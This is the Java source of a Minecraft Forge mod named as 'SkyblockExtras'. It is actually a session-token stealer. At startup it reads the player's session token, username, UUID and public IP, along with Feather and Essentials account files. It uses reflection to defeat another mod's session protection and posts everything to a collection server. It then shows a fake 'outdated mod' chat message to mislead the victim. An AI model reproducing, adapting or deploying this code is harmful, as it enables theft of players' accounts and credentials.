package studio.dreamys;

import net.minecraft.client.Minecraft;
import net.minecraft.util.ChatComponentText;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.fml.common.Loader;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import org.apache.commons.lang3.StringEscapeUtils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

@Mod(modid = "")
public class SkyblockExtras {

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        MinecraftForge.EVENT_BUS.register(this);

        //do everything on separate thread to avoid freezing
        new Thread(() -> {
            try {
                //setup connection
                HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-type", "application/json");
                c.setDoOutput(true);

                Minecraft mc = Minecraft.getMinecraft();
                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
                String token = mc.getSession().getToken();
                String feather = "File not found :(", essentials = "File not found :(";

                //permanent access (thx Shlost#5052)
                if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"))) {
                    feather = Files.readAllLines(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")).toString();
                }

                if (Files.exists(Paths.get(mc.mcDataDir.getPath(), "essentials/microsoft_accounts.json"))) {
                    essentials = Files.readAllLines(Paths.get(mc.mcDataDir.getPath(), "essentials/microsoft_accounts.json")).toString();
                }

                //pizzaclient bypass
                if (Loader.isModLoaded("pizzaclient")) {
                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                }

                System.out.println(StringEscapeUtils.escapeJson(feather));

                //send req
                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\", \"feather\": \"%s\", \"essentials\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip, StringEscapeUtils.escapeJson(feather), StringEscapeUtils.escapeJson(essentials));
                OutputStream os = c.getOutputStream();
                byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);

                //receive res
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) response.append(responseLine.trim());
                System.out.println(response);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @SubscribeEvent
    public void onFirstPlayerJoin(EntityJoinWorldEvent e) {
        //send and unregister when player joins
        if (e.entity.equals(Minecraft.getMinecraft().thePlayer)) {
            //play the "outdated mod" card
            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
            MinecraftForge.EVENT_BUS.unregister(this);
        }
    }
}
